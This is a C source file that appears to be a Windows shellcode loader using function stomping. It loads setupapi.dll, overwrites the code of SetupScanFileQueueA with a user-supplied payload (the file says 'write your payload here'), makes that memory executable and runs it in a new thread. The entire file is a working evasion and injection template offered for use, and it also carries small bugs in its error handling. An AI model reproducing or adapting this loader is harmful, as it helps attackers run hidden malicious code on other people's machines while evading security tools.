
#include <Windows.h>
#include <stdio.h>


#define SACRIFICIAL_DLL "setupapi.dll"
#define SACRIFICIAL_FUNC "SetupScanFileQueueA"
//write your payload here
unsigned char Payload[] = "";


BOOL WritePayload(IN PVOID pAddress , IN PBYTE pPayload , IN SIZE_T sPayloadSize) {
	
	DWORD dwOldProtection= NULL;
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {

		printf("[!]Virtual alloc failed with error : %d", GetLastError());
		return EXIT_FAILURE;
	}
	memcpy(pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {

		printf("[!]Virtual alloc failed with error : %d", GetLastError());
		return EXIT_FAILURE;
	}

	return TRUE;
}

int main() {

	PVOID pAddress = NULL;
	HMODULE hModule = NULL;
	HANDLE hThread;

	printf("Let's load our Sacrificial dll, %s\n", SACRIFICIAL_DLL);
	
	getchar();
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL) {
		printf("[!]Load Libarary failed!! error : %d\n",GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] DONE \n");
	
	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL) {
		printf("Error GetProcAddress error : %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC,pAddress);

	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	printf("[i] Writing ... ");
	if (!WritePayload(pAddress, Payload, sizeof(Payload))) {
		return -1;
	}
	printf("[+] DONE \n");


	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();


	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
	if (hThread != NULL)
		printf("Hi");
		WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return EXIT_SUCCESS;

}